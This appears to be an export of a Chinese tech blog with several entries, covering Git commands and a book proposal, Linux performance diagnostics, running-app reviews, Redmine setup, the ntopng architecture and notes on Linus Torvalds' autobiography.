    <content type="text"><![CDATA[摘要 思路：《红楼梦》的版本问题 技术出版选题（Git）（电子工业出版社 | 2016） 《红楼梦》的版本问题 甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”） 己卯本（名“脂砚斋四阅评过，己卯冬定本”） 庚辰本（名“脂砚斋四阅评过，庚辰秋定本”） 俄藏本 程高本 代码分包 Perl:pm Java:jar Node.js:npm Go:gvm you can only really use Git if you understand how Git works. Git ABCInstall1234567wget https://github.com/git/git/archive/&#123;tag&#125;.tar.gzgunzip &#123;tag&#125;.tar.gzcd git-&#123;tag&#125;make configure./configure --prefix=/usr/localmakemake install 初始化12345678910git clone git://urlgit init-db## configgit config user.name "your name"git config user.email yourname@email_servergit config core.editor vimgit config core.paper "less -N"git config color.diff truegit var -l 查看已经设置的配置 Git 中的状态： HEAD 代表当前最新状态 tag 某个状态的标签 SHA1 每个提交的唯一标识 Git 中有四种对象,都由 SHA1 值表示, .git 目录中保存了全部信息。 blob 文件 tree 目录 commit 提交历史 tag 标签 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# 显示 file 在 HEAD 中的 SHA1 值git ls-tree HEAD file# 显示一个 SHA1 的类型git cat-file -t SHA1# 显示一个 SHA1 的内容git cat-file type SHA1## diffgit diff tag 比较tag和HEAD之间的不同git diff tag file 比较一个文件在两者之间的不同git diff tag1..tag2 比较两个tag之间的不同git diff SHA11..SHA12 比较两个提交之间的不同git diff tag1 tag2 file orgit diff tag1:file tag2:file 比较一个文件在两个tag之间的不同## loggit log file 查看一个文件的改动git log -p 查看日志和改动git log tag1..tag2 查看两个tag之间的日志git log -p tag1..tag2 file 查看一个文件在两个tag之间的不同git log tag.. 查看tag和HEAD之间的不同## add/delete/ls:git add -a 添加所有文件(除了.gitignore)git rm file 从git仓库中删除文件git commit 添加或是删除后要提交git ls-files -m 显示修改过的文件git ls-files 显示所有仓库中的文件## commitgit commit -a -e 提交全部修改文件，并调用vim编辑提交日志git reset HEAD^ orgit reset HEAD~1 撤销最后一次提交。git reset --hard HEAD^ 撤销最后一次提交并清除本地修改git reset SHA1 回到SHA1对应的提交状态。## patch:git format-patch -1 生成最后一个提交对应的patch文件。git am &lt; patch 把一个patch文件加入git仓库中。git am --resolved 如果有冲突，在解决冲突后执行。git am --skip 放弃当前git am所引入的patch。## conflict:git merge 用于合并两个分支。git diff 如果有冲突，直接使用diff查看，冲突代码用&lt;&lt;&lt;和&gt;&gt;&gt;表示。手动修改冲突代码。git update-index 更新修改后的文件状态。git commit -a -e 提交为解决冲突而修改的代码。## branch:git branch -a 查看所有分支。git branch new_branch 创建新的分支。git branch -d branch 删除分支。git checkout branch 切换当前分支。-f参数可以覆盖未提交内容。 技术出版选题一：Git主要思路：技术、工程实践、文化心理三者关系1.工具需要和工程实践结合，本身存在不同的应用范式2.每一种技术实现背后，除了操作手册，还有必要了解背后发明者的故事， 发明者的动机、哲学观会深入影响到技术实现。3.一项技术能够落地，还需要与自己所在组织的文化、心理契合 结果：电子工业出版社：2016 选题阶段枪毙 第一部分 玩转Git 引子1：如何搭建一个免费的博客？（类似：http://www.jianshu.com/p/fd878edb95e7 ）普遍性需求－&gt;抛出问题(内容版本、不仅仅是用于代码管理，建构个人知识库) 引子2：引入开源框架遇到问题怎么办？内容： http://www.jianshu.com/p/8addb7d0024f（开源社区的正确打开方式） 第2章 开启Git之旅 2.1 Git生态简介谁发明？ 谁在用？ 2.2 10分钟安装指南Install、First Commit、First Push部分回答引子的问题 2.4 Git客户端工具集 2.5 Git服务端工具集 第二部分 源码解读 第3章 数据结构 3.1 文件 3.2 库 3.3 分支 3.2 标签 第4章 核心动作 4.1 add 4.2 commit 4.3 push 4.4 merge （调用关系） 第5章 从0到1: Git源码演进 5.1 第一版Git什么样 第三部分 工程应用 第6章 到底要不要使用分支？ 6.1 个人开发者范式（最简单的入门应用范式） 6.2 单一产品团队范式 6.3 开源社区范式：以Linux开发模式为例 6.4 多项目团队范式 第7章 到底要不要分库？ 7.1 分库的一般原则 7.2 极客模式（参考资料：Google所有代码都在一个库） 第8章 权限控制问题企业应用的突出问题： Git为什么不支持代码分权分域？发明者：自由软件原教旨主义 &amp; 开源社区了解冲突、选型过程、企业适配 第四部分 附录《Linus Torvalds TED访谈实录：Linux和Git的故事》 （为什么会有Git,Git与Linux的渊源） Git源码解读 Git data model Repository Branch Merge Collaborate 可选论题：Git为什么不支持代码分权分域：作者是自由软件原教旨主义者；源于Linux开发模式 竞品分析 《Git团队协作》 Tips12345$ git pull origin masterFrom github.com:riboseyim/go-hello * branch master -&gt; FETCH_HEADfatal: refusing to merge unrelated histories$ git pull origin master --allow-unrelated-histories 扩展阅读：DevOps 漫谈系列 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 git log – the Good Parts 为什么美术和策划在使用 git 时会遇到更多麻烦 | 云风的BlOG 《Understanding Git Conceptually》 Git内部原理 Git作者之一Scott Chacon的站点 (企业实践，包含代码治理有关内容)Python向来以慢著称，为啥Instagram却唯独钟爱它？]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 操作系统专题]]></title>
    <url>%2F2016%2F05%2F28%2FLinux%2F</url>
    <content type="text"><![CDATA[摘要 Linux世界的运转，在很多方面像一个自由市场，或者像一个由很多利己个体组成的生态系统。– 《大教堂与集市》 历史 技术 运营 Overview of the OS 待完善：增加移动操作系统部分，Linux 与 Android的关系 The History 《Linus Torvalds:Just for Fun》 谁是王者：macOS vs Linux Kernels ？ How The Linux Works电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 池建强:《跨越边界》 图灵社区:《码农增刊·Linus与Linux》]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>OpenSource</tag>
        <tag>OperatingSystem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[战斗体能训练：跑步]]></title>
    <url>%2F2016%2F04%2F26%2FPHT-Running%2F</url>
    <content type="text"><![CDATA[摘要 标准美国陆军体能要求 U.S. Army Physical Fitness Requirements : Running (2 Miles) TimeScoreTimeScoreTimeScoreTimeScore12:5416:246619:542923:2413:0016:306520:002823:3013:0616:366420:062623:3613:1216:426320:122523:4213:1810016:486220:182423:4813:249916:546120:242323:5413:309817:006020:302224:0013:369717:065920:362124:0613:429617:125820:422024:1213:489517:185720:481924:1813:549417:245620:541824:2414:009217:305521:001724:3014:069117:365421:061624:3614:129017:425221:121524:4214:188917:485121:181424:4814:248817:545021:241224:5414:308718:004921:301125:0014:368618:064821:361025:0614:428518:124721:42925:1214:488418:184621:48825:1814:548318:244521:54725:2415:008218:304422:00625:3015:068118:364322:06525:3615:127918:424222:12425:4215:187818:484122:18325:4815:247718:543922:24225:5415:307619:003822:30126:0015:367519:063722:36026:0615:427419:123622:4226:1215:487319:183522:4826:1815:547219:243422:5426:2416:007119:303323:0026:3016:067019:363223:0616:126919:423123:1216:186819:483023:18 工具与技术 拓展阅读体能训练 Physical Training | 美军体能训练观察 Physical Training | 军警体能标准横向评测 Physical Training | 训练项目：跑步 Physical Training | 训练项目：跳绳 Physical Training | 跑步路线推荐 Physical Training | 跑步应用评测 讲武堂 讲武堂|中国传统兵法摘要 外军研究|美军士官制度观察 外军研究|军警体能标准横向评测 外军研究|军队体能标准横向评测 外军研究|美军授勋和嘉奖制度观察 太公分猪肉—香港特区授勋和嘉奖制度批判 参考文献]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>讲武堂</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:Tools]]></title>
    <url>%2F2016%2F04%2F26%2FTools%2F</url>
    <content type="text"><![CDATA[摘要场景：日常场景：创作场景：项目管理场景：论文 一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。 场景：常规活动加速器 RSS OmniFouse （注意力是最稀缺资源） 邮件过滤器 场景：生产力 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（五）基于网络爬虫制作可视化图表 场景：创作 最佳写作实践：从Evernote到Ulysses 我的写作工具链 场景：项目管理 《凤凰项目》| 从作坊到工厂的寓言故事 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 场景：论文 Texture：一个优雅的开源学术论文书写工具 Classic Papers:谷歌学术推出“经典论文”排行 参考文献 Ariel Diaz:适合创业团队的必备工具栈]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断高级课程]]></title>
    <url>%2F2016%2F04%2F26%2FLinux-Perf-Master%2F</url>
    <content type="text"><![CDATA[摘要 方法论 性能诊断指南 How Linux Works 动态追踪技术 案例与实务 推荐书单 方法论 方法 信息收集 观测分析 统计分析 容量规划 调优 生命周期分析 实验分析 假设分析 街灯 Yes 随机变动 Yes 责怪他人 Yes Ad Hoc 核对清单法 Yes Yes 问题陈述法 Yes 科学法 Yes 循环诊断法 Yes 工具法 Yes USE法 Yes 工作负载特征归纳 Yes Yes 向下挖掘分析 Yes 延时分析 Yes R 方法 Yes 时间跟踪 Yes 基础线统计 Yes 性能监控 Yes Yes 排队论 Yes Yes 静态性能调整 Yes Yes 缓存调优 Yes Yes 微基准测试 Yes 容量规划 Yes Yes 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 案例与实务 最佳工程实践：Stack Overflow 架构 - 2016 Edition 最佳工程实践：Oracle 数据库迁移割接实践 最佳工程实践：基于LVS的AAA负载均衡架构实践 VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer 推荐书单电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 读书笔记|《图解性能优化》 性能分析的基础:吞吐和响应的区别 实际系统中的性能分析 性能调优 &amp; 性能测试 虚拟化环境下的性能 云环境下的性能 《24小时365天不间断服务》《性能之巅》《Google核心技术》快捷方式12345678# 按内存排序，由大到小;rsz为实际内存ps -e -o &apos;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&apos; | grep oracle | sort -nrk5# 查看打开的文件lsof# 查看 Threadsps m 参考文献 Server-side I/O Performance: Node vs. PHP vs. Java vs. Go Linkedin:Real-time distributed tracing for website performance and efficiency optimizations 推荐书单 程序员需要跨过性能这个坎 | 原创 2017-07-13 池建强 MacTalk 望闻问切，解决Linux系统性能问题 | 2016-10-10 Brendan Gregg 开发资讯]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（二）跑步应用数据可视化评测]]></title>
    <url>%2F2016%2F04%2F26%2FVisualization-RunningApp%2F</url>
    <content type="text"><![CDATA[摘要 案例：跑步应用Nike+ Running 和 Garmin Mobile 评测 评估场景：跑步 评估时间：2016.02.22 评估说明：所有评测数据为作者真实体验测量，不针对特定厂家。 首发版（简书）：跑步应用Nike+ Running 和 Garmin Mobile 评测 |20160222 评估框架本次评估将以此为框架，逐一对比，双方都有的特性直接抵消忽略，不再讨论。核心子系统可概括为：硬件平台、跑步系统、数据分析系统、教练系统、荣誉系统、社交系统、其它支持。作为一款个人应用产品，社交系统是各厂追逐的王冠。 评估框架 竞争项目明细 主页系统 分析系统 Nike: 数据高度融合，无时无刻不突出变化、突出趋势 Garmin:数据离散、基本无融合，平铺直叙 (更正：20160513 v3.6 已实现心率、高度、步频叠加层) 社交应用基于庞大的消费群体、软件的低门槛，Nike+ Running的用户基数应该大很多（暂无统计数字支撑）。 日历系统：各有千秋 荣誉系统在这一单项中，Garmin的劣势非常明显，完全暴露的产品设计、运营能力的巨大短板。Nike+ Running则形成了非常完善的勋章系统，有利于提高用户粘性，为很多厂家所借鉴。包括但不限于： 里程：段位等级制（个人综合） 奖杯制 （每月，分为金、银、铜等） 积分：5K、10K、50K、100K等 连续性：1周3次、1周5次、连续3个月、连续6个月等 纪念性：周年、特殊节日、夜猫子、运动鞋、微博分享纪念等 荣誉系统－Nike+徽章体系 荣誉系统－Garmin徽章体系:能走点心吗？ 教练系统按照不同目标，可以推荐制定个人训练计划，并提供分析数据，不仅提高了趣味性，更体现了对入门级玩家的关怀。 硬件平台Garmin自有硬件平台,已经形成高低搭配的产品线，但是也限制了其APP兼容其他硬件厂家的可能性。Nike前几年尝试过内嵌跑鞋的传感器、TomTom贴牌代工的Sport Watch, 市场反馈看起来不好。几款产品目前都已停产，其战略完全转为纯软件路线：包括第一批支持Apple Watch,成为预置APP，全面支持Apple Health,支持TomTom、Garmin终端采集数据共享。 改进空间数据分析系统中，如果可以选择多次训练数据进行对比，应用的实用性和娱乐性会更强。甚至可以推荐相同“赛段”的历史数据对比。在户外运动场景，温度、湿度、风力、天气、气压的情况对成绩有较大影响。目前这两款应用都只做到记录当天的天气概况（晴、雨等），对于深度、活跃用户来说略显不足。第三点不足，基于众所周知的原因，或者大陆运营力量的不足，数据上传、售后服务皆有不稳定的情况。 结论 Nike+ Running： 系出豪门，设计感强，交互体验完胜； Garmin Connect Mobile : 自有硬件平台优势突出，设计体验凌乱，运营优待提升。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考案例 共享单车APP评测 | 优恪]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
        <tag>数据可视化</tag>
        <tag>移动互联网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:开源项目管理平台Redmine]]></title>
    <url>%2F2016%2F04%2F26%2FTeamWork-Redmine%2F</url>
    <content type="text"><![CDATA[概要 不管别人如何干扰，如何制造事端，最优秀的将领总是能达到预期的木笔而不会受制于作战计划。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227） Redmine 基于Redmine的项目管理平台 “过程有记录，责任可追踪”,开发、运营过程中需要持续关注的基础信息，都可以通过统一平台沉淀、分析和改进优化。 BASICInstall RedmineBitName 提供了一个包含 Ruby、RAILS、MySQL、Apache 等依赖的集成安装包。 12345678# 1.解压~/redmine-1.2.1-1/apps/redmine/vender/plugins$ cd redmine-1.2.1-1# 2.安装$ ./use_redmine# 3.配置$ cd apps/redmine/vender/pluginsrake$ db:migrate_plugins RAILS_ENV=production 数据结构 Kanban Kanban看板管理实践精要 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 张逸：可视化设计工作坊]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源架构技术漫谈：基于 Ntopng 实现网络流量的可视化监控]]></title>
    <url>%2F2016%2F04%2F26%2FNetwork-Ntopng%2F</url>
    <content type="text"><![CDATA[摘要 NTOPNG是NTOP的新一代版本,提供以下特性： 多协议网络流量；IPv4/IPv6活跃主机 网络流量监控； 基于nDPI实现应用协议发现 作为 NetFlow/sFlow 采集器 (Cisco/ Juniper 路由器) ；交换机配合 nProbe. What ntopng can do for me? http://www.ntop.org/products/ntop Sort network traffic according to many protocols Show network traffic and IPv4/v6 active hosts Store on disk persistent traffic statistics in RRD format Geolocate hosts Discover application protocols by leveraging on nDPI, ntop’s DPI framework. Characterise HTTP traffic by leveraging on characterisation services provided by block.si. ntopng comes with a demo characterisation key, but if you need a permanent one, please mail info@block.si. Show IP traffic distribution among the various protocols Analyse IP traffic and sort it according to the source/destination Display IP Traffic Subnet matrix (who’s talking to who?) Report IP protocol usage sorted by protocol type Act as a NetFlow/sFlow collector for flows generated by routers (e.g. Cisco and Juniper) or switches (e.g. Foundry Networks) when used together with nProbe. Produce HTML5/AJAX network traffic statistics Ntopng 架构 主要开发语言C、C++、Python、Lua 数据采集层Libpcap ：网络数据包捕获函数包 ZeroMQ一个C内核及C＋＋编写的核心库libzmq，50余种语言支持的绑定程序(例如Python支持PyZMQ)，号称最快的消息库，协议级，目标是成为Linux的一部分。 业务处理层Monitoring Engine，负责采集数据的规整、压缩、转储。 存储Sqlite：轻型数据库，多语言支持（此处为python）Gdbm：DBM的GNU版本，使用hash存储非结构化数据 RedisRedis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Ntopng的Redis数据结构如下： 前端展现层RRDtool 源自MRTG（多路由器流量绘图器）。MRTG是有一个大学连接到互联网链路的使用率的小脚本开始的。MRTG后来被当作绘制其他数据源的工具使用，包括温度、速度、电压、输出量等等。 Geoip：IP GIS图形 其它库autoconf、automake、pkg-config、libtool（提供通用的库编译支持）Gettext、icu4c：国际化(I18N)和本地化(L10N)，多语言支持 libffi“FFI” 的全名是 Foreign Function Interface，通常指的是允许以一种语言编写的代码调用另一种语言的代码。而 “Libffi” 库只提供了最底层的、与架构相关的、完整的”FFI”，因此在它之上必须有一层来负责管理两种语言之间参数的格式转换。 Gobject-introspection：（简称 GI）用于产生与解析 C 程序库 API 元信息，以便于动态语言（或托管语言）绑定基于 C + GObject 的程序库 json-glib、json-c、openssl、glib libtasn1：开发 ASN.1 (Abstract Syntax Notation One) 结构管理的 C 库gmpNettle：a low-level cryptographic library （加密）Gnutls：（加密）libpng：the official PNG reference library （图形）pixman：像素管理（图形）Cairo：a2Dgraphicslibrarywithsupportformultipleoutputdevices.Freetype：FreeType库是一个完全免费（开源）的、高质量的且可移植的字体引擎，它提供统一的接口来访问多种字体格式文件，包括TrueType,OpenType, Type1, CID,CFF, Windows FON/FNT, X11 PCF等fontconfig：字体库管理 P2P 演示案例 Paper How ntop built (an Open Source) Web-based Traffic Analysis and Flow collection with #InfluxDB 扩展阅读网络管理 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow 数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System Preview:数据可视化（五）可视化数据图表制作方法 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科技史漫谈：Linus Torvalds 与 Linux 操作系统]]></title>
    <url>%2F2016%2F04%2F24%2FLinusTorvalds%2F</url>
    <content type="text"><![CDATA[摘要 The mind behind Linux Just for Fun ！ Linus 无疑是一个顶级黑客，想想有多少人能从零开始建造一个完整的具有产品级质量的操作系统内核？ – 《大教堂与集市》 Linus Torvaldsborn December 28, 1969. is a Finnish-American software engineer who is the creator and, for a long time, principal developer, of the Linux kernel;which became the kernel for operating systems such as the Linux operating system, Android, and Chrome OS.He also created the distributed revision control system Git. 一、TED Talks：The mind behind Linux （中文翻译）Linus Torvalds: The mind behind Linux TED现场版 二、Linux 之父：Just for Fun ！读书笔记（序）《Just for Fun: The Story of an Accidental Revolutionary》，是Linux内核的创建者林纳斯·托瓦兹（Linus Torvalds）的自传。这本书由他和大卫·戴蒙德（David Diamond）联合撰写，叙述林纳斯·托瓦兹从小的成长历程、创建Linux内核、Git的过程以及软件世界的江湖恩怨。全书主体部分采用一问一答的访谈形式，由戴蒙德在他们的的汽车旅行过程中记录完成；另外一部分收录了林纳斯的几篇专题论述文章，比如作者关于软件版权的一些批判性意见。 I was an ugly child.I was a nerd.I was A geek.关于自己的童年，林纳斯显然有着强烈的阴影。首先，他自认为是一个长得非常丑的孩子(ugly: unpleasant to look)。具体来说就包括极度没品味的衣着，Torvalds家族标志性的大鼻子，不擅长体育运动、腼腆害羞以及最重要的：很难引起妹子的关注(关于这一点，老林在全书多次反复提到)。 Nerd一词本来原意“a person who is boring, stupid and not fashionable”。俚语中一个稍含贬义的用语，一般指偏爱钻研书本知识，将大量闲暇用于脑力工作，对流行文化不感兴趣，而不愿或不善于体育活动或其他社会活动的人。相对于那些擅长体育、四肢发达、自信且善于泡妞的人来说，nerd的青春说起来都是眼泪啊。 geek和nerd这个词类似，江湖俗称发烧友或怪咖，通常被用于形容对计算机和网络技术有狂热兴趣并投入大量时间钻研的人。它们现在已经在IT圈里流行起来，逐渐从贬义词变成了具有自豪感和身份认同意义的词语，很多中关村或深圳的咖啡店里面都有很多自称Geek的人在和各路投资人畅聊IPO的美好图景。我想这显然归功于林纳斯这代牛人不遗余力地科普推广。 Tell you about Family.关于Torvalds家族，主要有三个特点： 教授之家林纳斯·托瓦兹的外祖父家族原来只是贫穷的农民，直到外祖父那一代，六兄弟中有两人获得博士学位。（p13）Leo Törnqvist是芬兰第一批统计学教授，同时意外地开启了林纳斯的编程之路。教授购买了一台Commodore VIC 20电脑，期望用户解决工作中遇到的统计计算问题，显然老教授并不善此道。彼时小林纳斯11岁，仅仅是因为好玩，通过阅读手册自学了指令集，并开始使用BASIC语言编写一些统计学方面的小程序。 破碎之家（dysfunctional family）林纳斯的父母在他很小的时候就离异了。“At times we lived with my dad and his girlfriend, at other times Sara lived with my dad and I lived with my mom.At times both of us lived with my mom.” 他的祖父晚年中风，祖母也年老体弱，一家老小挤在一所旧房子里。作为职业女性，林纳斯的母亲经常需要工作到很晚，林纳斯只得和妹妹自己去购物、安排晚餐。在艰难的日子里，电脑是唯一的寄托。“The computer found a home on a tiny desk against the window, maybe two feet from my bed.(p19)” 左派之家Torvalds家族的一大鲜明特色就是左翼传统。祖父是一名诗人和记者，父亲、母亲都是记者，曾是芬兰学生运动、左翼社会运动的活跃分子。直到林纳斯，坚持开放源代码理念也就顺理成章了。他本人对于金钱本身一直也没什么概念，直到1999年，Red Hat公司依靠Linux赚到不好意思以后，主动要求赠送一大笔股票期权给林纳斯（估值2000万美元）。在黑客的江湖里，林纳斯也许是最知名的“喷子”之一：例如，抨击Nvidia是他所接触过的“最烂的公司”（the worst company）和 “最麻烦的公司”（the worst trouble spot），有一次与人争论Git为何不使用C++开发时与对方用“放屁”（原文为“bullshit”、“BS”）互骂，更曾以“一群自慰的猴子”（原文为“OpenBSD crowd is a bunch of masturbating monkeys”）来称呼OpenBSD团队。不用奇怪，这也许只是他们家的记者基因灵魂附体而已。 About Finnish Army1989年，大学二年级，林纳斯加入芬兰国防军服11个月的国家义务兵役，军衔少尉，领导一个四、五个人小团队。他们的工作是负责火炮控制单元，大概是指示目标、弹道计算之类。林纳斯无意于军官职业，也不喜好当领导，军旅生活中最重要的一件事就是看书： So there were two things I did that summer.Nothing.And read the 719 pages of 《Operating System:Design and Implementation》 《操作系统：设计与实现》，作者Andrew S. Tanenbaum的这本书，激活了这位年轻人的视野，促成了林纳斯从事操作系统开发的职业生涯。 不管怎么说，林纳斯对于这段生活是非常感念的： some people suggest that the major reason for the required army duty is to give Finnish men something to talk about over beer for as long as they live.They all have something miserable in common.They hated the Army, but they’re happy to talk about it afterward.(p30) Tell you about Finland.在这么略带自黑的幽默自传中，作者对祖国芬兰的深情溢于言表。 芬兰地处严寒，有四分之一的地方处在北极圈内，最北的地区夏天有73天太阳不落于地平线下，冬天则有51天不出太阳。大概有500多万居民，93%的人使用芬兰语，大部分可以说英语。70%以上的人属于芬兰信义宗教会（路德宗）的成员。最大的民俗特点就是：一：低调内敛、不爱说话，如果有什么事他们更爱发短信（诺基亚手机发短信还真是无敌）二：宅，死宅！中国的国粹是麻将，芬兰的国粹就是桑拿浴，或者说桑拿才是芬兰真正的国家宗教。“Nobody actually knows how this religion started, but the tradition, at least in some places, is to build the sauna first, then the house.” (芬兰谚语：先建桑拿，再搭房屋) 芬兰的教育系统让人印象深刻，有一种英特纳雄耐尔已经实现的即时感。教育国策一：教育免费。不仅免学费、而且提供全额伙食补助。不仅保障城里人就近入学，还为偏远地区学生提供免费交通运输系统。教育国策二：学术教育与职业教育平衡发展。高中就有学术性的文理高中和职业高中，高等教育分成“研究性大学”(university) 以及科技大学(芬兰语ammattikorkeakoulu)系统。500万人口的小国居然有17间大学以及27间科技大学。教育国策二：教育平等。天朝惯有的排名制、淘汰法，是在国家法律和社会信仰层面所不能容忍的。教育系统不使用淘汰，分组或是放弃任何一位学生。 Finnish schools don’t separate out the good students-or the losers.(p25) 对于林纳斯这类一度具有阅读障碍的“Math Guy”，在某些方面（体育、社交等）非常自卑的人来说，并不妨碍他们过上好日子。芬兰教育系统有着非常丰富的奖学金体系，例如林纳斯的第一部电脑，就是通过高中时代的奖学金购买的（估值500欧元，5000元人民，算上那个年代的购买力，少说上万）。那可是1980年代，计算机才刚刚个人化，是非常昂贵的设备。就算30多年后今天，中国任何一所普通高中每学期的单科奖学金到万元标准的也不多吧。 The biggest ones were on the order of $500. So that’s where most of the money for my second computer came from. 据说今年在克强CEO的严重关切和亲自督战下，财政部和教育部把中国高校博士生的津贴从每生每年12000元大幅提高到15000元，即每生每月提高250元。还真不如一个芬兰的高中生。所以，关键问题都要看数字。科教兴国是不是扯淡，领导是不是真的重视你，只要看账上那点饷银就清楚了。 meaning for life There are three things that have meaning for life.They are the motivational factors for everything in your life——for anything that you do or any living thing does:The first is survival, the second is social order, and the third is entertainment. Everything in life progresses in that order.And there is nothing after entertainment. So, in a sense, the implication is that the meaning of life is to reach that third stage. And once you’ve reached the third stage, you’re done. But you have to go through the other stages first. “人类的追求分成三个阶段。第一是生存，第二是社会秩序，第三是娱乐。最明显的例子是性，它开始只是一种延续生命的手段，后来变成了一种社会行为，比如你要结婚才能得到性。再后来，它成了一种娱乐。” （是不是有点离经叛道? 我竟无力反驳) It started out as survival, but it became a social thing.That’s why you get married.And then it becomes entertainment. “技术最初也是为了生存，为了生存得更好。现在技术大体上还处于社会的层面，但正在朝娱乐的阶段发展。……（Linux的开发模式）为人们提供了依靠兴趣与热情而生活的机会。与世界上最好的程序员一起工作，是一种无与伦比的享受。” Technology came about as survival.And survival is not about just surviving, it’s about surviving better. 人生在世，Just for fun. What can I do to make society better?You known that you’re a part of society.You known that society is moving in this direction.You can help society move in this direction. Introduction:Post-its from a RevolutionAcknowledgmentsPreface:The Meaning of Life I (Sex,War,Linux)BIRTH OF A NERDI. I was an ugly child. I was a nerd. A geek. II. My earliest and happiest memories involve playing with my grandfather’s old electronic calculator. III. Tell you about Finland &amp; Family IV. Family History (more details) Talk: Linus Torvalds &amp; David Diamond an editor of the San Jose Mercury News Sunday 